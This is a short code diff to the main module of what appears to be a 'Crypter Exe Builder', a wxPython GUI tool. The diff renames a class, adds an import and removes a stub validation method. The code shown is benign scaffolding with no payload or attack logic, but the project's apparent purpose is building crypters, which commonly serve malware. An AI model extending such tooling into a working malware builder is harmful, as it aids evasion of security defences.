@@ -1,12 +1,12 @@
 '''
-@summary: Crypter Builder: Main
+@summary: Crypter Exe Builder: Main
 @author: MLS
-@version: 0.1
 '''
 
 # Import libs
 import wx
 import json
+import time
 
 # Import package modules
 from .Gui import Gui
@@ -16,7 +16,7 @@ from .Base import *
 ###################
 ## BUILDER CLASS ##
 ###################
-class Builder():
+class ExeBuilder():
     '''
     @summary: Provides the main Builder object. Controls calls to all other areas
     '''
@@ -34,7 +34,7 @@ class Builder():
         
         # Initialise the Builder GUI
         app = wx.App()
-        builder_gui = Gui(self.validate, config_dict)
+        builder_gui = Gui(config_dict)
         builder_gui.Show()
         app.MainLoop()
         
@@ -55,12 +55,3 @@ class Builder():
         return config_dict
             
         
-    def validate(self, config_dict):
-        '''
-        @summary: Performs configuration validation. 
-        @param config_dict: A dict containing the build configuration key value pairs
-        @raise ValidationException: If an item fails to validate
-        '''
-        
-        # If config is empty, set to default
-        print(config_dict)
